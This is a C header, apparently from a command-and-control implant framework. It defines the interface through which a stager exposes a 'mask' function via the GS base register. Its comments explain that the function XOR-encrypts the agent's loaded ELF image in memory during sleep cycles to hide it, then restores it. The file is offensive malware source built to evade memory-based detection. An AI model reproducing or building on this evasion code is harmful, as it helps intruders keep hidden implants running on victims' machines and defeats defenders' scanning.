#ifndef C2_STAGER_IFACE_H
#define C2_STAGER_IFACE_H

/*
 * stager_iface.h — same-process cooperation ABI between the stager and agent.
 *
 * The agent runs in the stager's process, so no descriptor or helper process is
 * needed: the stager publishes its mask entry point in the state block it
 * already installs as the x86_64 GS base (see stager state.h). The agent reads
 * that block once and calls the mask function directly during its existing
 * sleep cycle.
 *
 * The mask function makes the agent ELF writable, XORs it in place with a fresh
 * random key, sleeps, and restores it before returning. The agent MUST have
 * joined or stopped every other thread first: the mask runs on this thread and
 * nothing may execute agent code while the image is masked.
 */

#include <stddef.h>
#include <stdint.h>

#define C2_STAGER_ABI_MAGIC 0x53475031u
#define C2_STAGER_ABI_VERSION 1u

typedef int (*c2_stager_mask_fn)(unsigned seconds, uintptr_t probe);

/* Prefix of the stager state block installed as the GS base. The first field
 * must stay the self pointer because get_stager_state() reads %gs:0. */
struct c2_stager_public {
  void *self;
  uint64_t abi_magic;
  uint64_t abi_version;
  c2_stager_mask_fn mask_fn;
};

#ifdef __cplusplus
extern "C" {
#endif

/* Read the mask entry point from the stager state block. 0 when installed. */
int c2_stager_mask_bind(void);

/* 1 when a mask stub was published by the stager. */
int c2_stager_mask_available(void);

/*
 * Mask this process's agent image for `seconds` around a sleep. `probe` is an
 * address inside the agent ELF (the stub uses it to find the loaded image).
 * Returns 0 only after a full mask/sleep/restore cycle.
 */
int c2_stager_masked_sleep(unsigned seconds);

#ifdef __cplusplus
}
#endif

#endif /* C2_STAGER_IFACE_H */
